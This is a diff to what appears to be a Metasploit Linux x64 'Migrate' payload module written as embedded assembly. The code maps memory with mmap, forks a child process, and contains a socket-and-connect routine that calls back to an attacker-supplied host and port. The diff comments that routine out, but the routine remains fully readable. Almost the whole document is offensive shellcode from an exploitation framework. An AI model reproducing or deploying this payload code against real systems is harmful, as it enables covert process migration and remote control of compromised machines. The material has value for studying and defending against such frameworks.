@@ -63,14 +63,15 @@ module Payload::Linux::X64::Migrate
       xor r8,r8
       dec r8
       xor r9, r9
-      syscall
+      syscall ; mmap
       
       push rax
       pop r9
-      int 3
+      int 3 ; stop and copy payload there
+
       push 0x39
       pop rax
-      syscall
+      syscall ; fork()
       
       cmp rax, 0
       jz _exec_child
@@ -93,31 +94,31 @@ _exec_parent:
       int 3
 _exec_child:
 
-      push r9
-      push   1        ; retry counter
-      pop    r9
-      push   0x29
-      pop    rax
-      cdq
-      push   0x2
-      pop    rdi
-      push   0x1
-      pop    rsi
-      syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
-      pop r9
-      xchg   rdi, rax
-
-    connect:
-      mov    rcx, 0x#{encoded_host}#{encoded_port}
-      push   rcx
-      mov    rsi, rsp
-      push   0x10
-      pop    rdx
-      push   0x2a
-      pop    rax
-      syscall ; connect(3, {sa_family=AF_INET, LPORT, LHOST, 16)
-      mov rax, 0x70
-      syscall
+;      push r9
+;      push   1        ; retry counter
+;      pop    r9
+;      push   0x29
+;      pop    rax
+;      cdq
+;      push   0x2
+;      pop    rdi
+;      push   0x1
+;      pop    rsi
+;      syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
+;      pop r9
+;      xchg   rdi, rax
+;
+;    connect:
+;      mov    rcx, 0x#{encoded_host}#{encoded_port}
+;      push   rcx
+;      mov    rsi, rsp
+;      push   0x10
+;      pop    rdx
+;      push   0x2a
+;      pop    rax
+;      syscall ; connect(3, {sa_family=AF_INET, LPORT, LHOST, 16)
+;      mov rax, 0x70
+;      syscall ; setsid
       xchg rsi, r9
       push #{opts[:payload_length]}
       pop rdx
